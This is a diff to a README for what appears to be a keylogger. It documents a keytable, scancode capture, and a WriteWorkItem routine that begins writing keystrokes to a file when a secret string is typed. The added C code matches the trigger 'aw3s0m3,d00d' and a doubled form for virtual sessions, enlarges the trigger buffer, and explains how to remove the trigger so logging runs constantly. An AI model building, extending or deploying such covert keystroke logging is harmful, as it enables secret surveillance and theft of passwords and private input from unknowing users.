@@ -13,14 +13,28 @@ The mapping in `keytable` is to my keyboard, it may need to be adjusted for your
 
 ## Logging
 ### Activation
-There is a check in `WriteWorkItem` that will initiate writing to a file. This string can be changed to your own secret combination, however, it must fit in the 16 byte buffer to be checked. If the buffer is not aligned, you may run into issues or need to keep trying the string until it activates. You can increase the buffer at `LOG_TRIGGER_POINT`.
+There is a check in `WriteWorkItem` that will initiate writing to a file. This string can be changed to your own secret combination, however, it must fit in the 32 byte buffer to be checked. If the buffer is not aligned, you may run into issues or need to keep trying the string until it activates. You can increase the buffer at `LOG_TRIGGER_POINT`.
+
+Also, if you want to match your secret string in both local and virtual sessions, you must match the 'press' and 'release' for local and 'press' only for virtual.
 ```c
-if (strstr("aw3s0m3,d00d", secretBuffer) != 0) {
-  WriteToLogFile = WorkingLogging;
-}
+	char target_string[] = "aw3s0m3,d00d";
+	char target_string2[] = "aaww33ss00mm33,,dd0000dd";
+  
+  if (strstr(secretBuffer, target_string) != NULL)
+			{
+				WriteToLogFile = WorkingLogging;
+				//clear secretBuffer to start checking again
+				memset(secretBuffer, 0, sizeof(secretBuffer));
+			}
+      else if (strstr(secretBuffer, target_string2) != NULL)
+			{
+				WriteToLogFile = WorkingLogging;
+				//clear secretBuffer to start checking again
+				memset(secretBuffer, 0, sizeof(secretBuffer));
+			}
 ```
 
-If you do not want activation, remove the check:
+If you do not want activation, remove the check and move `WriteToLogFile = WorkingLogging` to the main `strcat` call
 ```c
 if (scancode >= 0 && scancode < SZ_KEYTABLE)
 {
